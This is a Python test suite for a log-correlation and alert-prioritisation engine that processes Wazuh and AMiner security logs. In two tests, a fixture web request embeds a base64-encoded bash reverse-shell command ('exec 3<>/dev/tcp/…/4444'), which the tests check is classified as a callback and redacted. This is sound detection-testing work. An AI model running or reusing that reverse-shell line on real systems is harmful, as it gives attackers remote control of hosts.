import base64
import builtins
import copy
import io
import json
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest.mock import patch
from urllib.parse import quote

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import server
from engine import OnlineEngine, classify
from telemetry import normalize, safe_text


def wazuh(raw='Jan 24 03:00:00 intranet-server freshclam: update complete', stamp='2022-01-24T03:00:00Z', **extra):
    return {'@timestamp': stamp, 'id': '1685715378.241', 'full_log': raw,
            'predecoder': {'hostname': 'intranet-server'}, 'rule': {'level': 3, 'id': '1', 'description': 'alert'}, **extra}


def aminer(raw, stamp=1642996800, training=False):
    return {'AnalysisComponent': {'AnalysisComponentType': 'NewMatchPathDetector', 'TrainingMode': training},
            'LogData': {'Timestamps': [stamp], 'RawLogData': [raw], 'LogResources': ['/var/log/apache2/intranet-access.log']}}


class PipelineTests(unittest.TestCase):
    def test_event_time_and_eve_without_full_log(self):
        event = normalize(wazuh(data={'src_ip': '192.0.2.5', 'dest_ip': '192.0.2.8', 'alert': {'signature': 'port scan'}}, full_log=''), 'test_wazuh.json', 7)
        self.assertEqual(event['time'], '2022-01-24T03:00:00Z')
        self.assertEqual(event['src'], '192.0.2.5')
        self.assertIn('port scan', event['raw'])
        self.assertEqual(classify(event)[0], 'recon')

    def test_structural_preparation_does_not_decode_or_classify_payload(self):
        encoded = base64.b64encode(json.dumps(['bash', '-c', 'exec 3<>/dev/tcp/192.0.2.5/4444']).encode()).decode()
        raw = f'172.19.131.174 - - [24/Jan/2022:04:00:00 +0000] "GET /uploads/x.php?wp_meta={quote(encoded,safe="")} HTTP/1.1" 200 14'
        with patch('telemetry.payload_features', side_effect=AssertionError('Pre-stream command inspection')):
            event = normalize(aminer(raw), 'test_aminer.json', 3)
        self.assertNotIn(encoded, event['raw'])
        self.assertEqual(classify(event)[0], 'callback')
        engine = OnlineEngine()
        engine.ingest(event)
        public = json.dumps(engine.snapshot())
        self.assertNotIn(encoded, public)
        self.assertNotIn('_payload', public)
        self.assertIn('[redacted]', public)

    def test_online_causality_and_relationship_strength(self):
        engine = OnlineEngine()
        encoded = base64.b64encode(json.dumps(['bash', 'exec 3<>/dev/tcp/192.0.2.5/4444']).encode()).decode()
        request = f'172.19.131.174 - - [24/Jan/2022:04:00:00 +0000] "GET /uploads/x.php?wp_meta={quote(encoded,safe="")} HTTP/1.1" 200 14'
        engine.ingest(normalize(aminer(request), 'test_aminer.json', 1))
        prefix = copy.deepcopy(engine.timeline)
        before = engine.snapshot()
        self.assertEqual(before['edge_count'], 0)
        self.assertEqual(before['candidates'], [])
        engine.ingest(normalize(wazuh('Jan 24 04:00:01 intranet-server su: Successful su for jhall by www-data', '2022-01-24T04:00:01Z'), 'test_wazuh.json', 2))
        self.assertEqual(engine.timeline[:1], prefix)
        self.assertEqual(engine.snapshot()['edge_count'], 1)
        self.assertEqual(next(iter(engine.edges.values()))['confidence'], 'low')
        self.assertIn('actor continuity unproven', next(iter(engine.edges.values()))['basis'])

    def test_training_does_not_create_operational_edges_and_repeats_are_counted(self):
        raw='Jan 24 04:00:00 intranet-server su: Successful su for jhall by www-data'
        engine=OnlineEngine()
        engine.ingest(normalize(aminer(raw,training=True),'test_aminer.json',1))
        engine.ingest(normalize(aminer(raw,training=True),'test_aminer.json',2))
        group=next(iter(engine.groups.values()))
        self.assertEqual(group['count'],2)
        self.assertEqual(group['unique'],1)
        self.assertEqual(group['operational_unique'],0)
        self.assertEqual(group['confidence'],'low')
        self.assertEqual(len(engine.edges),0)

    def test_unknown_hosts_cannot_be_correlated_as_one_host(self):
        engine=OnlineEngine()
        events=[aminer('scan nmap from 192.0.2.5'), aminer('type=SERVICE_STOP res=success',1642996801)]
        for i,obj in enumerate(events):
            obj['LogData']['LogResources']=['/var/log/audit/audit.log']
            engine.ingest(normalize(obj,'test_aminer.json',i+1))
        self.assertEqual(len(engine.edges),0)

    def test_reused_entities_in_different_datasets_do_not_connect(self):
        engine=OnlineEngine()
        first=normalize(aminer('Jan 24 04:00:00 intranet-server nmap from 192.0.2.5'),'fox_aminer.json',1)
        second=normalize(aminer('Jan 24 04:00:01 intranet-server su: Successful su for jhall by www-data',1642996801),'shaw_aminer.json',1)
        engine.ingest(first);engine.ingest(second)
        self.assertEqual(len(engine.edges),0)
        self.assertEqual({g['scenario'] for g in engine.groups.values()},{'fox','shaw'})
        third=normalize(aminer('Jan 24 04:00:02 intranet-server su: Successful su for jhall by www-data',1642996802),'fox_aminer.json',2)
        engine.ingest(third)
        self.assertEqual(len(engine.edges),1)
        self.assertEqual(engine.candidates()[0]['scenario'],'fox')

    def test_labels_are_unreadable_through_complete_replay_then_verify_frozen_results(self):
        real_builtin, real_io = builtins.open, io.open
        label_reads=[]
        def guard(original):
            def wrapped(file,*args,**kwargs):
                if str(file).endswith('labels.csv'):
                    label_reads.append(str(file))
                    raise AssertionError('Inference attempted to open labels')
                return original(file,*args,**kwargs)
            return wrapped
        with tempfile.TemporaryDirectory() as directory:
            root=Path(directory);(root/'ait_ads').mkdir()
            (root/'ait_ads/russellmitchell_wazuh.json').write_text('\n'.join(json.dumps(wazuh(stamp=f'2022-01-24T03:00:{i:02}Z')) for i in range(30)))
            (root/'ait_ads/russellmitchell_aminer.json').write_text(json.dumps(aminer('Jan 24 03:00:31 intranet-server CRON: normal',1642993231)))
            (root/'labels.csv').write_text('scenario,attack,start,end\nrussellmitchell,network_scans,1642993200,1642993300\n')
            with patch.object(server,'ROOT',root),patch.object(server,'INPUTS',root/'telemetry-inputs'),patch.object(server,'CACHE',root/'.cache'),patch.object(server,'CATALOG',{}),patch('builtins.open',guard(real_builtin)),patch('io.open',guard(real_io)):
                server.CATALOG['russellmitchell']={'status':'loading'}
                server.prepare_worker('russellmitchell')
                self.assertEqual(server.CATALOG['russellmitchell']['status'],'ready')
                run=server.Run('russellmitchell',1,'events');run.start()
                time.sleep(.15);run.action('pause');count=run.engine.processed
                time.sleep(.06);self.assertEqual(run.engine.processed,count)
                run.action('step');time.sleep(.06);self.assertEqual(run.engine.processed,count+1)
                run.action('resume');run.worker.join(10)
                self.assertEqual(run.status,'complete')
                self.assertEqual(run.engine.processed,31)
                self.assertEqual(label_reads,[])
            from verification import verify
            before=run.snapshot()
            result=verify(root,'russellmitchell',tuple(run.engine.timeline))
            self.assertEqual(result['rows'][0]['records'],31)
            self.assertEqual(run.snapshot(),before)

    def test_replay_drains_cursor_when_catalog_understates_records(self):
        with tempfile.TemporaryDirectory() as directory:
            root=Path(directory);(root/'ait_ads').mkdir()
            (root/'ait_ads/fox_wazuh.json').write_text('\n'.join(json.dumps(wazuh(stamp=f'2022-01-24T03:00:{i:02}Z')) for i in range(3)))
            (root/'ait_ads/fox_aminer.json').write_text('')
            with patch.object(server,'ROOT',root),patch.object(server,'INPUTS',root/'inputs'),patch.object(server,'CACHE',root/'.cache'),patch.object(server,'CATALOG',{'fox':{'status':'loading'}}):
                server.prepare_worker('fox')
                server.CATALOG['fox']['total']=1
                run=server.Run('fox',1,'events');run.start();run.worker.join(5)
                try:
                    self.assertEqual(run.status,'complete')
                    self.assertEqual(run.engine.processed,3)
                    self.assertEqual(run.snapshot()['total'],3)
                    self.assertEqual(run.snapshot()['dataset_totals']['fox'],3)
                finally:
                    if run.status in ('running','paused'):
                        run.action('cancel')
                    run.worker.join(1)

    def test_no_ip_mapping_or_unsupported_dns_exfiltration_claim(self):
        obj=wazuh(data={'srcip':'192.0.2.2','dstip':'192.0.2.3:443'},agent={'ip':'10.10.10.10'})
        event=normalize(obj,'test_wazuh.json',1)
        self.assertEqual((event['src'],event['dst'],event['sensor']),('192.0.2.2','192.0.2.3','10.10.10.10'))
        event=normalize(aminer('Jan 24 04:00:00 intranet-server dnsmasq: query[TXT] '+ 'a'*90 + '.example from 192.0.2.5'),'test_aminer.json',2)
        family,confidence,reason=classify(event)
        self.assertEqual((family,confidence),('dns','low'))
        self.assertIn('not proof',reason)

    def test_priority_uses_evidence_not_detector_repeat_volume(self):
        engine=OnlineEngine()
        request='172.19.131.174 - - [24/Jan/2022:04:00:00 +0000] "GET /missing HTTP/1.1" 404 14'
        for line in range(100):
            engine.ingest(normalize(aminer(request),'test_aminer.json',line+1))
        web=next(iter(engine.groups.values()))
        self.assertEqual((web['count'],web['unique'],web['priority']), (100,1,'context'))
        engine.ingest(normalize(wazuh('Jan 24 04:00:01 intranet-server su: Successful su for jhall by www-data','2022-01-24T04:00:01Z'),'test_wazuh.json',1))
        snapshot=engine.snapshot()
        self.assertEqual(snapshot['groups'][0]['priority'],'high')
        self.assertEqual(snapshot['groups'][0]['count'],1)
        self.assertGreater(snapshot['groups'][0]['priority_score'],web['priority_score'])
        self.assertEqual(sum(snapshot['priority_counts'].values()),snapshot['group_count'])
        self.assertEqual(snapshot['priority_counts'],snapshot['dataset_priority_counts']['test'])
        self.assertIn('causality is unproven',snapshot['groups'][0]['priority_reason'])

    def test_training_priority_promotes_only_when_operational_evidence_arrives(self):
        engine=OnlineEngine()
        raw='Jan 24 04:00:00 intranet-server su: Successful su for jhall by www-data'
        engine.ingest(normalize(aminer(raw,training=True),'test_aminer.json',1))
        self.assertEqual(engine.snapshot()['groups'][0]['priority'],'routine')
        engine.ingest(normalize(aminer(raw,1642996801,training=False),'test_aminer.json',2))
        snapshot=engine.snapshot()
        self.assertEqual(snapshot['group_count'],1)
        self.assertEqual(snapshot['groups'][0]['priority'],'high')
        self.assertEqual(snapshot['groups'][0]['confidence'],'high')
        self.assertEqual(snapshot['priority_counts'].get('routine',0),0)
        self.assertEqual(snapshot['priority_counts']['high'],1)
        self.assertTrue(any('Review priority changed' in h['detail'] for h in snapshot['history']))

    def test_generic_severity_stays_context(self):
        engine = OnlineEngine()
        for i in range(20):
            event = normalize(wazuh(rule={'level': 15, 'id': '99', 'description': 'Generic anomaly'}), 'test_wazuh.json', i + 1)
            engine.ingest(event)
        group = engine.snapshot()['groups'][0]
        self.assertEqual((group['family'], group['confidence'], group['priority']), ('anomaly', 'medium', 'context'))

    def test_ssh_identification_requires_distinct_operational_pattern(self):
        engine = OnlineEngine()
        raw = 'Jan 24 04:00:00 intranet-server sshd: Did not receive identification string from 192.0.2.5'
        event = normalize(aminer(raw), 'test_aminer.json', 1)
        engine.ingest(event)
        self.assertEqual(engine.snapshot()['groups'][0]['priority'], 'context')
        for _ in range(20):
            engine.ingest(copy.deepcopy(event))
        self.assertEqual(engine.snapshot()['groups'][0]['priority'], 'context')
        for i in range(20):
            engine.ingest(normalize(aminer(raw, 1642996801 + i, training=True), 'test_aminer.json', 30 + i))
        self.assertEqual(engine.snapshot()['groups'][0]['priority'], 'context')
        for i in range(1, 10):
            engine.ingest(normalize(aminer(raw, 1642996820 + i), 'test_aminer.json', 60 + i))
        group = engine.snapshot()['groups'][0]
        self.assertEqual(group['priority'], 'investigate')
        self.assertIn('scan.ssh_identification', group['rules'])

    def test_ssh_identification_window_expires(self):
        engine = OnlineEngine()
        raw = 'Jan 24 04:00:00 intranet-server sshd: Did not receive identification string from 192.0.2.5'
        for i in range(10):
            engine.ingest(normalize(aminer(raw, 1642996800 + i * 301), 'test_aminer.json', i + 1))
        self.assertTrue(all(g['priority'] == 'context' for g in engine.groups.values()))

    def test_explicit_scan_remains_investigate(self):
        engine = OnlineEngine()
        engine.ingest(normalize(wazuh('Explicit nmap scan signature'), 'test_wazuh.json', 1))
        self.assertEqual(engine.snapshot()['groups'][0]['priority'], 'investigate')

    def test_distinct_web_burst_moves_from_context_to_investigate(self):
        engine=OnlineEngine()
        for i in range(25):
            raw=f'172.19.131.174 - - [24/Jan/2022:04:00:00 +0000] "GET /path-{i} HTTP/1.1" 404 14'
            engine.ingest(normalize(aminer(raw,1642996800+i),'test_aminer.json',i+1))
        group=engine.snapshot()['groups'][0]
        self.assertEqual((group['priority'],group['confidence'],group['unique']),('investigate','medium',25))
        self.assertEqual(engine.snapshot()['priority_counts'].get('context',0),0)

    def test_priority_shortlist_preserves_earlier_dataset_and_tier(self):
        engine=OnlineEngine()
        engine.ingest(normalize(wazuh(),'shaw_wazuh.json',1))
        for i in range(600):
            obj=wazuh('nmap scan',predecoder={'hostname':f'host-{i}'})
            engine.ingest(normalize(obj,'fox_wazuh.json',i+1))
        snapshot=engine.snapshot()
        self.assertEqual(sum(snapshot['priority_counts'].values()),601)
        self.assertEqual(snapshot['dataset_priority_counts']['shaw']['routine'],1)
        self.assertTrue(any(g['scenario']=='shaw' and g['priority']=='routine' for g in snapshot['groups']))
        scores=[g['priority_score'] for g in snapshot['groups']]
        self.assertEqual(scores,sorted(scores,reverse=True))


if __name__=='__main__':
    unittest.main()
